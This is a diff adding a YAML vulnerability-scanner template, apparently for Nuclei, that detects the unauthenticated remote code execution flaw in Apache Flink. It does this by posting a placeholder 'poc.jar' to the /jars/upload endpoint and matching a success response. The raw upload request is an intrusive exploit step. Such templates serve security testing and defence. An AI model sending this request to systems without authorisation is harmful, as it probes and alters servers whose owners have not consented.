@@ -1,0 +1,49 @@
+http:
+    - matchers:
+        - condition: and
+          part: header
+          type: word
+          words:
+            - application/json
+        - condition: and
+          part: body
+          type: word
+          words:
+            - success
+            - _poc.jar
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /jars/upload HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
+
+          --8ce4b16b22b58894aa86c421e8759df3
+          Content-Disposition: form-data; name="jarfile";filename="poc.jar"
+          Content-Type:application/octet-stream
+
+            {{randstr}}
+          --8ce4b16b22b58894aa86c421e8759df3--
+id: apache-flink-unauth-rce
+info:
+    author: pikpikcu
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: Apache Flink
+    metadata:
+        max-request: 1
+    name: Apache Flink - Remote Code Execution
+    reference: Apache Flink contains an unauthenticated remote code execution vulnerability. - https://www.exploit-db.com/exploits/48978 - https://adamc95.medium.com/apache-flink-1-9-x-part-1-set-up-5d85fd2770f3 - https://github.com/LandGrey/flink-unauth-rce
+    severity: critical
+    tags:
+        - flink
+        - intrusive
+        - unauth
+        - authenticate
+        - Apache-Flink
+        - Apache Flink
